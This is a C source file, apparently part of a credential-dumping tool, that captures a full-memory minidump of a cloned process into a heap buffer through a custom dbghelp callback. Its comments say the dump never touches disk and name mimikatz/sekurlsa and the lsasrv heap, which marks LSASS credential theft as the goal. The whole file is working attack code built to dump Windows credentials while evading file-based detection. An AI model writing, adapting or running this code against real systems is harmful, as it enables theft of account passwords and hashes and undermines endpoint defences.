/*
 * minidump_inmemory.c — MiniDumpWriteDump into a heap buffer (no file).
 *
 * MiniDumpWriteDump expects a HANDLE for the output. We supply a callback
 * that intercepts every write and copies it into a growing heap buffer.
 *
 * The callback is the standard MINIDUMP_CALLBACK_INFORMATION with type
 * IoStartCallback / IoWriteAllCallback / IoFinishCallback. We never let
 * the dump touch disk — output.c handles encrypted disk write.
 */
#include "common.h"
#include <dbghelp.h>

/*
 * MinGW's _MINIDUMP_CALLBACK_INPUT is missing the Io union member
 * (and a few others) that exist in the Win SDK. Shadow the struct
 * with the SDK layout and cast the parameter we receive.
 *
 * Layout from MS public docs (dbghelp.h):
 *   ULONG  ProcessId;
 *   HANDLE ProcessHandle;
 *   ULONG  CallbackType;
 *   union { ... HRESULT Status; ... MINIDUMP_IO Io; ... };
 */
typedef struct _MINIDUMP_IO_FULL {
    HANDLE  Handle;
    ULONG64 Offset;
    PVOID   Buffer;
    ULONG   BufferBytes;
} MINIDUMP_IO_FULL;

typedef struct _MD_CB_INPUT_FULL {
    ULONG  ProcessId;
    HANDLE ProcessHandle;
    ULONG  CallbackType;
    union {
        HRESULT          Status;
        MINIDUMP_IO_FULL Io;
        ULONG_PTR        raw[8];   /* covers larger union members */
    } u;
} MD_CB_INPUT_FULL;

typedef struct {
    BYTE   *buf;
    SIZE_T  cap;
    SIZE_T  off;
} MD_CTX;

static BOOL md_ensure(MD_CTX *c, SIZE_T need) {
    if (c->off + need <= c->cap) return TRUE;
    SIZE_T newcap = c->cap ? c->cap * 2 : 0x100000;
    while (newcap < c->off + need) newcap *= 2;
    BYTE *nb = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, c->buf, newcap);
    if (!nb) {
        nb = (BYTE*)HeapAlloc(GetProcessHeap(), 0, newcap);
        if (!nb) return FALSE;
        if (c->buf) {
            memcpy(nb, c->buf, c->off);
            HeapFree(GetProcessHeap(), 0, c->buf);
        }
    }
    c->buf = nb;
    c->cap = newcap;
    return TRUE;
}

static BOOL CALLBACK md_callback(PVOID param,
                                 const PMINIDUMP_CALLBACK_INPUT in_orig,
                                 PMINIDUMP_CALLBACK_OUTPUT out) {
    MD_CTX *c = (MD_CTX*)param;
    const MD_CB_INPUT_FULL *in = (const MD_CB_INPUT_FULL*)in_orig;
    switch (in->CallbackType) {
    case IoStartCallback:
        out->Status = S_FALSE;  /* tell dbghelp to use our IO */
        return TRUE;

    case IoWriteAllCallback: {
        ULONG64 off = in->u.Io.Offset;
        ULONG   sz  = in->u.Io.BufferBytes;
        if (!md_ensure(c, (SIZE_T)(off + sz))) {
            out->Status = E_OUTOFMEMORY;
            return FALSE;
        }
        memcpy(c->buf + off, in->u.Io.Buffer, sz);
        if (c->off < (SIZE_T)(off + sz)) c->off = (SIZE_T)(off + sz);
        out->Status = S_OK;
        return TRUE;
    }

    case IoFinishCallback:
        out->Status = S_OK;
        return TRUE;

    case IncludeModuleCallback:
    case IncludeThreadCallback:
    case ModuleCallback:
    case ThreadCallback:
    case ThreadExCallback:
    case MemoryCallback:
        return TRUE;

    default:
        return FALSE;
    }
}

BOOL md_dump_to_memory(HANDLE hClone, BYTE **out_buf, SIZE_T *out_size) {
    MD_CTX ctx = {0};
    MINIDUMP_CALLBACK_INFORMATION ci = { .CallbackRoutine = md_callback,
                                         .CallbackParam = &ctx };

    DWORD pid = GetProcessId(hClone);
    if (!pid) { ERR("GetProcessId(clone) err=%lu", GetLastError()); return FALSE; }

    /* MiniDumpWithFullMemory is what mimikatz/sekurlsa parses; smaller
     * variants miss the lsasrv heap allocations.
     */
    BOOL ok = MiniDumpWriteDump(hClone, pid, NULL,
                                MiniDumpWithFullMemory,
                                NULL, NULL, &ci);
    if (!ok) {
        ERR("MiniDumpWriteDump err=%lu", GetLastError());
        if (ctx.buf) HeapFree(GetProcessHeap(), 0, ctx.buf);
        return FALSE;
    }
    *out_buf  = ctx.buf;
    *out_size = ctx.off;
    LOG("MiniDump in-memory: %zu bytes", ctx.off);
    return TRUE;
}
